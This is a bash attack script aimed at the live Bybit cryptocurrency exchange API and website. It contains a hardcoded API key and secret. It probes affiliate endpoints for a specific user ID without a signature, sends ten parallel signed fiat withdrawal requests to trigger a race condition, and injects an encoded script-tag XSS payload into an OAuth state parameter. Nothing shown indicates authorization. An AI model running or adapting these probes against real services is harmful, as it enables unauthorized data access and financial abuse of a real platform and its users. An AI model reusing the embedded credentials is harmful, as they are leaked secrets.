#!/bin/bash
# BYBIT "LAST HOPE" SCAN (NOV 2025)
# Target: Affiliate Leak (No-Sign), Fiat Race, OAuth State

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
WEB_BASE="https://www.bybit.com"

# Sync Time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
OFFSET=$((SERVER_TIME - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo "======================================================="
echo "BYBIT LAST HOPE SCAN"
echo "======================================================="

# 1. AFFILIATE LEAK (No Signature Test)
echo ""
echo "[1] Testing Affiliate Info Leak (No Signature)..."
# Try various likely endpoints without signature header
EPS=(
    "/v5/affiliate/info"
    "/v5/user/affiliate/info"
    "/v5/affiliate/affiliate-info"
)

for ep in "${EPS[@]}"; do
    echo "    -> GET $ep (Key Only)"
    resp=$(curl -s -X GET "$BASE$ep?uid=527465456" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-RECV-WINDOW: 5000")
    
    # Check if we got data despite no signature
    if echo "$resp" | grep -q "retCode\":0"; then
        echo "    🚨 LEAK CONFIRMED! Got success without signature."
        echo "    Response: $resp"
    else
        code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
        msg=$(echo "$resp" | grep -o '"retMsg":"[^"]*"' | cut -d'"' -f4)
        echo "       Result: $code ($msg)"
    fi
done

# 2. FIAT WITHDRAWAL RACE (Logic Probe)
echo ""
echo "[2] Testing Fiat Withdrawal Race (Validation Logic)..."
# Does it check KYC/Balance BEFORE or AFTER locking?
# We send a request with timestamp manipulation

PAYLOAD='{"amount":"1","currency":"USD"}'
# Generate valid signature
IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")

echo "    -> Sending 10 parallel requests (Race)..."
for i in {1..10}; do
    curl -s -X POST "$BASE/v5/fiat/withdraw" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" &
done
wait
echo ""
echo "    Race sent. Checking for anomalies (e.g. 2 different error codes)..."

# 3. OAUTH STATE XSS
echo ""
echo "[3] Testing OAuth State XSS..."
# Encoded payload: <script>alert(1)</script>
STATE_PAYLOAD="%3Cscript%3Ealert(1)%3C%2Fscript%3E"
URL="$WEB_BASE/app/oauth/authorize?client_id=TEST&response_type=code&redirect_uri=https://bybit.com&state=$STATE_PAYLOAD"

echo "    -> GET $URL"
resp_oauth=$(curl -s -I "$URL")
# Check if state is reflected in Location header or body (using -I checks headers)
if echo "$resp_oauth" | grep -q "<script>"; then
    echo "    🚨 REFLECTED XSS in Headers!"
else
    echo "    Headers clean (No reflection found in Location)."
fi

echo "======================================================="
echo "SCAN COMPLETE"
echo "======================================================="
